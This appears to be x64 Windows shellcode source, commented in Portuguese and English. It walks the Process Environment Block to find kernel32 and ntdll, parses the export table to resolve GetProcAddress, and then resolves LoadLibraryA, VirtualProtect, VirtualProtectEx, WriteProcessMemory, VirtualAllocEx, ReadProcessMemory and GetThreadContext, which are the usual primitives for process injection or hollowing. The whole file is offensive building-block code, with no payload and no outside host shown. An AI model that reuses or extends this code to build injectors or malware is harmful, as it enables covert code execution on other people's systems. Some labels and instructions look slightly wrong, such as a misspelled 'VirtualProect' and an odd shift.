		mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
		add rbx, r8; # RBX = Nome da funcao VMA
		dec rcx; # Decrementa o loop em 1
		mov rax, 0x41636f7250746547; # GetProcA
		cmp [rbx], rax; # checa se rbx é igual a  GetProcA
		jnz kernel32findfunction2;  
	
; Encontra o endereço da função de GetProcessAddress
FunctionNameFound2:                 
		; We found our target
		xor r11, r11; 
		mov r11d, [rdx+0x24]; # AddressOfNameOrdinals RVA
		add r11, r8; # AddressOfNameOrdinals VMA
		; Get the function ordinal from AddressOfNameOrdinals
		inc rcx; 
		mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
		; Get function address from AddressOfFunctions
		xor r11, r11; 
		mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
		add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
		mov eax, [r11+4+r13*4]; # Get the function RVA.
		add rax, r8; # Add base address to function RVA
		mov r14, rax; # GetProcAddress to R14
ret

;locate_kernel32
Locate_kernel32: 
	xor rcx, rcx; # Zera RCX
	mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
	mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
	mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
	lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
	xchg rax, rsi; # troca RAX,RSI
	lodsq; # Load qword at address (R)SI into RAX
	mov rbx, [rax + 0x20]; # RBX = Kernel32 base address
	mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
ret
    
IAT:
; Código para chegar na tabela de endereco de exportacao
	mov ebx, [rbx+0x3C];# obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
	add rbx, r8;# Add defrerenced signature offset to kernel32 base. Store in RBX.
	mov r12, 0x88FFFFF;      
	shr r12, 0x14; 
	mov edx, [rbx+r12];   # Offset from PE32 Signature to Export Address Table (NULL BYTE)
	add rdx, r8;# RDX = kernel32.dll + RVA ExportTable = ExportTable Address
	mov r10d, [rdx+0x14]; # numero de funcoes
	xor r11, r11;# Zera R11 para ser usado 
	mov r11d, [rdx+0x20]; # AddressOfNames RVA
	add r11, r8;# AddressOfNames VMA
ret

;locate_ntdll
Locate_ntdll:        
	xor rcx, rcx; # Zera RCX
	mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
	mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
	mov rsi, [rax + 0x30]; # 0x30 Offset = ProcessEnvironmentBlock.Ldr.InInitializationOrderModuleList
	mov rbx, [rsi +0x10]; # dll base ntdll
	mov r8, rbx; # Copia o endereco base da ntdll para o registrador R8
ret

LoadLibrary:        
	mov rcx, 0x41797261;  
	push rcx;  
	mov rcx, 0x7262694c64616f4c;  
	push rcx;  
	mov rdx, rsp; # joga o ponteiro de LoadLibraryA para RDX
	mov rcx, r8; # Copia endereco base do Kernel32 para RCX
	sub rsp, 0x30; # Make some room on the stack
	call r14; # Call GetProcessAddress
	add rsp, 0x30; # Remove espaço alocado na pilha
	add rsp, 0x10; # Remove a string LoadLibrary alocada 
	mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
ret
	
VirtualProect:
; pega o endereco VirtualProtect usando GetProcAddress
	mov rcx, 0x746365746f72
	push rcx
	mov rcx, 0x506C617574726956
	shr rcx, 0x40
	push rcx
	mov rdx, rsp; # joga o ponteiro da string VirtualProtect para RDX
	mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
	sub rsp, 0x30
	call r14; # Call GetProcessAddress
	add rsp, 0x30; # Remove espaço locdo na pilha
	add rsp, 0x10; # Remove a string alocada de  VirtualProtect 
	mov rsi, rax; # Guarda o endereço de Virtual protect em RSI
ret

VirtualProectEx:
; pega o endereco VirtualProtect usando GetProcAddress
	sub rsp, 0x30
	mov rax, "rotectEx"
	push Rax
	mov rax, "VirtualP"
	push rax
	mov [rsp+0x10], byte 0x00
	mov rdx, rsp; # joga o ponteiro da string VirtualProtectEx para RDX
	mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
	sub rsp, 0x30
	call r14; # Call GetProcessAddress
	add rsp, 0x30; # Remove espaço locdo na pilha
	add rsp, 0x10; # Remove a string alocada de  VirtualProtect 
	mov rsi, rax; # Guarda o endereço de Virtual protect em RSI
	mov r12, rax
	add rsp, 0x30
ret

WriteProcess:
	;Lookup WriteProcess
	mov rax, "ry"
	push rax
	mov rax, "cessMemo"
	push rax
	mov rax, "WritePro"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12, rax
	add rsp, 0x30
	add rsp, 0x18
ret

VirtualAllocEx:
	;Lookup VirtualAllocEx
	mov rax, "llocEx"
	push rax
	mov rax, "VirtualA"
	push rax
	lea rdx, [rsp]
	mov rcx, r8
	sub rsp, 0x30
	call r14
	add rsp, 0x30
	add rsp, 0x10
	mov r12, rax
ret

ReadProcessMemory:
	;Lookup ReadProcessMemory
	mov rax, "y"
	push Rax
	mov rax, "essMemor"
	push Rax, 
	mov rax, "ReadProc"
	push rax
	lea rdx, [rsp]
	mov rcx, rbx
	sub rsp, 0x30
	call R14
	add rsp, 0x30
	add rsp, 0x10
	add rsp, 0x08
	mov r12, rax
ret

GetThreadCx:
	;Lookup GetThreadCx
	sub rsp, 0x30
	mov rax, "dContext"
	push Rax
	mov rax, "GetThrea" 
	push rax
	mov [rsp+0x10], dword 0x00
	lea rdx, [rsp]
	mov rcx, r8
	sub rsp, 0x30
	call R14
	add rsp,0x30
	add rsp,0x10
	add rsp, 0x30
	mov r12, rax
ret
